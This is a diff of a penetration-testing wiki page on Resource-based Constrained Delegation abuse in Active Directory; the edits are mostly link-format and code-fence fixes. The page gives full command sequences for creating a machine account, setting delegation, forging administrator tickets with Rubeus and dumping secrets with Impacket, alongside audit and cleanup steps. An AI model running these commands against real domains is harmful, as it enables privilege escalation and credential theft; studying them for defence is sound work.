@@ -1,10 +1,8 @@
 # Resource-based Constrained Delegation
 
-
-
 ## Basics of Resource-based Constrained Delegation
 
-This is similar to the basic [[constrained-delegation.md|Constrained Delegation]] but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
+This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
 
 In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
 
@@ -36,12 +34,12 @@ To check the _**MachineAccountQuota**_ of the domain you can use:
 ```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
-```
+
 ## Attack
 
 ### Creating a Computer Object
 
-You can create a computer object inside the domain using **[[https://github.com/Kevin-Robertson/Powermad|powermad]]:**
+You can create a computer object inside the domain using **[powermad](https://github.com/Kevin-Robertson/Powermad):**
 
 ```bash
 import-module powermad
@@ -50,7 +48,7 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-```
+
 ### Configuring Resource-based Constrained Delegation
 
 **Using activedirectory PowerShell module**
@@ -59,7 +57,7 @@ Get-DomainComputer SERVICEA
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-```
+
 **Using powerview**
 
 ```bash
@@ -76,7 +74,7 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-```
+
 ### Performing a complete S4U attack (Windows/Rubeus)
 
 First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
@@ -84,20 +82,20 @@ First of all, we created the new Computer object with the password `123456`, so 
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-```
+
 This will print the RC4 and AES hashes for that account.\
 Now, the attack can be performed:
 
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-```
+
 You can generate more tickets for more services just asking once using the `/altservice` param of Rubeus:
 
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
-```
+
 > [!CAUTION]
 > Note that users have an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him. This property can be seen inside bloodhound.
 
@@ -121,7 +119,7 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 # Example: dump local secrets via Kerberos (no NTLM)
 impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
-```
+
 Notes
 - If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
 - Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus both support AES-only flows.
@@ -135,10 +133,10 @@ In this example it was requested a TGS for the **CIFS** service from Administrat
 ```bash
 ls \\victim.domain.local\C$
 ```
-```
+
 ### Abuse different service tickets
 
-Learn about the [[silver-ticket.md#available-services|**available service tickets here**]].
+Learn about the [**available service tickets here**](silver-ticket.md#available-services).
 
 ## Enumerating, auditing and cleanup
 
@@ -161,14 +159,14 @@ Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
     }
   }
 ```
-```
+
 Impacket (read or flush with one command):
 
 ```bash
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
 ```
-```
+
 ### Cleanup / reset RBCD
 
 - PowerShell (clear the attribute):
@@ -178,7 +176,7 @@ Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
 # Or using the friendly property
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
 ```
-```
+
 - Impacket:
 
 ```bash
@@ -187,7 +185,7 @@ impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'do
 # Or flush the whole list
 impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
 ```
-```
+
 ## Kerberos Errors
 
 - **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
@@ -211,12 +209,11 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 
 ## References
 
-- [[https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html|https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html]]
-- [[https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/|https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/]]
-- [[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object|https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object]]
-- [[https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/|https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/]]
-- [[https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61|https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61]]
+- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
+- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
+- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
+- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 - Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
 - Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
-
 
